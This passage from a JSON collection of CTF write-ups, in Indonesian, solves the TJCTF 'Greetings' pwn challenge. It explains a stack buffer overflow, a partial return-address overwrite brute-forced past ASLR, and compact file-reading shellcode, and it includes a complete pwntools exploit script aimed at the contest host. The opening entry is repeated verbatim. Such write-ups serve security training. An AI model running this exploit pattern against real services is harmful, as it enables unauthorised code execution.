        "content": "Strukturnya:\n\n1. shellcode 61 byte\n2. NOP padding sampai total 72 byte\n3. satu byte `0x10` untuk overwrite low byte RIP\n\nKarena `fgets()` otomatis nulis null byte setelah itu, saved RIP berubah menjadi gadget `call rax` saat kondisi ASLR-nya pas, lalu execution lompat ke shellcode kita karena `rax` masih berisi pointer ke `uname`."
      },
      {
        "title": "Hasil",
        "content": "Exploit berhasil dengan brute-force cepat dan flag yang keluar:\n\n`tjctf{rAx_h01ds_r3t_v@lS?_189278}`"
      },
      {
        "title": "File",
        "content": "- `exploit.py` berisi exploit otomatis untuk remote\n\nJalankan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{rAx_h01ds_r3t_v@lS?_189278}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-pwn-geetings-bin",
    "title": "TJCTF - Greetings",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Tjcsc",
    "tags": [],
    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
    "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Source yang dikasih:\n\n\n\nHasil penting dari binary:\n\n- 64-bit PIE\n- no canary\n- stack executable\n- overflow ada di `fgets(uname, uname_size, stdin)`\n\nLayout stack dari `greetUser()` kasih offset 72 byte dari awal `uname` ke saved RIP.",
        "code": "void greetUser() {\n    int uname_size;\n    char uname[64];\n    printf(\"Enter the size of your username: \");\n    scanf(\"%d\", &uname_size);\n    getchar();\n    uname_size += 2;\n    printf(\"Enter username (start with @): \");\n    fgets(uname, uname_size, stdin);\n    if (*(char *) uname == '@') {\n        printf(\"Greetings to you: %s!\", uname);\n    }\n}"
      },
      {
        "title": "Ide awal yang gagal",
        "content": "Jalur paling natural adalah:\n\n1. isi buffer dengan shellcode\n2. overwrite RIP ke gadget `call rax`\n3. manfaatkan fakta bahwa `fgets()` mengembalikan pointer ke buffer di `rax`\n\nSecara lokal, ini memang jalan kalau ASLR dimatikan. Tapi di service nyata, alamat `call rax` ikut berubah karena PIE+ASLR."
      },
      {
        "title": "Trik yang kepake",
        "content": "Kunci challenge ini ada di interaksi antara `fgets()` dan saved RIP.\n\nKalau kita minta `fgets()` membaca **73 byte**:\n\n- 72 byte pertama mengisi buffer sampai tepat sebelum RIP\n- byte ke-73 menimpa **byte paling rendah** dari RIP\n- lalu `fgets()` otomatis menulis `\\\\0` sesudahnya, jadi **byte kedua RIP jadi nol**\n\nReturn address normal dari `greetUser()` menuju `main+9`, yang offset rendahnya `...89`. Gadget `call rax` ada di offset `...10`.\n\nJadi kita pakai partial overwrite:\n\n- low byte RIP kita paksa jadi `0x10`\n- byte berikutnya dipaksa jadi `0x00` oleh terminator `fgets`\n\nIni cuma sukses kalau byte kedua alamat return kebetulan memang cocok untuk page yang sama. Probabilitasnya sekitar **1/256** per koneksi. Karena service cepat dan fork-per-connection, brute-force ini sangat masuk akal."
      },
      {
        "title": "Kenapa shellcode-nya harus kecil",
        "content": "Karena partial overwrite ini cuma ngasih ruang **72 byte** sebelum RIP, shellcode harus muat penuh di situ. Shellcode yang saya pakai:\n\n- tidak spawn shell\n- langsung `open(\"/flag.txt\")`\n- `read()` isinya\n- `write(1, ...)`\n- `exit()`\n\nSaya tambahkan `add rsp, 0x200` di awal supaya buffer baca hasil file tidak menimpa shellcode di stack."
      },
      {
        "title": "Payload final",
        "content": "Strukturnya:\n\n1. shellcode 61 byte\n2. NOP padding sampai total 72 byte\n3. satu byte `0x10` untuk overwrite low byte RIP\n\nKarena `fgets()` otomatis nulis null byte setelah itu, saved RIP berubah menjadi gadget `call rax` saat kondisi ASLR-nya pas, lalu execution lompat ke shellcode kita karena `rax` masih berisi pointer ke `uname`."
      },
      {
        "title": "Hasil",
        "content": "Exploit berhasil dengan brute-force cepat dan flag yang keluar:\n\n`tjctf{rAx_h01ds_r3t_v@lS?_189278}`"
      },
      {
        "title": "File",
        "content": "- `exploit.py` berisi exploit otomatis untuk remote\n\nJalankan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{rAx_h01ds_r3t_v@lS?_189278}",
    "lessonsLearned": ""
  }
];
